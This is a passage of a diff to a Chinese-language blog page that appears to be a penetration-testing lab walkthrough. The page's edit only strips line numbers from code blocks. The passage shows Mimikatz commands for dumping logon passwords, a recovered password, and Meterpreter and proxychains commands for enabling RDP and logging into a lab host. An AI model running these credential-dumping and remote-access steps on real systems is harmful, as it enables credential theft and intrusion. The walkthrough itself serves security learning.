 <p><img src="https://img-blog.csdnimg.cn/20210412202210264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>获取密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210412202301919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>密码为Qwer1234</p>
 <hr>
-<h2 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(meterpreter)run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class="line">proxychains rdesktop 192.168.183.130</span><br></pre></td></tr></table></figure>
+<h2 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(meterpreter)run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class="line">proxychains rdesktop 192.168.183.130</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210412202402821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
